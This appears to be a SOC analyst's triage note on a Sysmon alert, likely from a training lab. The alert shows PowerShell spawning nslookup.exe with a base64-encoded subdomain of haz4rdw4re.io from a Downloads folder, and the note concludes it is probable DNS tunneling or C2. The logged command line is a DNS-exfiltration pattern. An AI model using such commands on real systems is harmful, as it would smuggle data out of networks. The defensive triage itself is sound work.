Description : A suspicious process with an uncommon parent-child relationship was detected in your environment.
datasource :sysmon
timestamp : 06/15/2026 14:52:54.431
event.code : 1
host.name : win-3450
process.name : nslookup.exe
process.pid : 3648
process.parent.pid : 3728
process.parent.name : powershell.exe
process.command_line : "C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io
process.working_directory : C:\Users\michael.ascot\downloads\
event.action  : Process Create (rule: ProcessCreate)
severity : HIGH 


MY OBSERVATIONS:
nslookup.exe was executed with strange domain.
The working directory is downloads malware often runs from downloads,temp folders
chances of command and control and dns tunneling


CONCLUSION:
suspicious activity - likely true positive

RECOMMENDED ACTIONS:
isolate the endpoints.
investigaate the powershell command.
check for similar activity on other host
